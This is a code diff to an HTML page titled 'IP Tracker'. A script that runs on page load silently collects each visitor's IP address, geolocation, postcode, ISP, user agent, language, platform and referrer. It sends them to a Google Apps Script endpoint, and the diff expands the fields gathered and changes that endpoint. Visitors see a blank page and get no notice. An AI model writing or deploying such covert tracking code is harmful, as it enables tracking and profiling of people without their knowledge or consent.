@@ -6,6 +6,7 @@
   <title>IP Tracker</title>
 </head>
 <body>
+
 <script>
 async function postData() {
   try {
@@ -14,14 +15,27 @@ async function postData() {
 
     const formData = new FormData();
     formData.append("nama", "Visitor");
+
+    // IP INFO
     formData.append("ip", ipData.ip || "-");
+    formData.append("hostname", ipData.hostname || "-");
     formData.append("kota", ipData.city || "-");
+    formData.append("region", ipData.region || "-");
     formData.append("negara", ipData.country || "-");
+    formData.append("postcode", ipData.postal || "-");
+    formData.append("timezone", ipData.timezone || "-");
     formData.append("isp", ipData.org || "-");
     formData.append("lokasi", ipData.loc || "-");
 
+    // DEVICE INFO
+    formData.append("browser", navigator.userAgent || "-");
+    formData.append("bahasa", navigator.language || "-");
+    formData.append("platform", navigator.platform || "-");
+    formData.append("referrer", document.referrer || "-");
+    formData.append("waktu", new Date().toLocaleString());
+
     await fetch(
-      "https://script.google.com/macros/s/AKfycby2e7KlEmFsgjiTu8hpcMqVwCF1hSBKmrG3CZ0jUdE6b0WqpXj0Q-oWHyYJBzQ1xB29/exec",
+      "https://script.google.com/macros/s/AKfycbwTWJU7tLZZ0Q-fxUTXwzxP3ioZdf_cjGY-vNJzHxbhg11eQiYNS6vwn0kCLVDtnhiD/exec",
       {
         method: "POST",
         body: formData,
@@ -29,14 +43,16 @@ async function postData() {
       }
     );
 
-    console.log("Data terkirim");
+    console.log("Data lengkap terkirim");
 
   } catch (err) {
     alert("API GAGAL: " + err);
     console.error(err);
   }
 }
+
 window.onload = postData;
 </script>
+
 </body>
 </html>
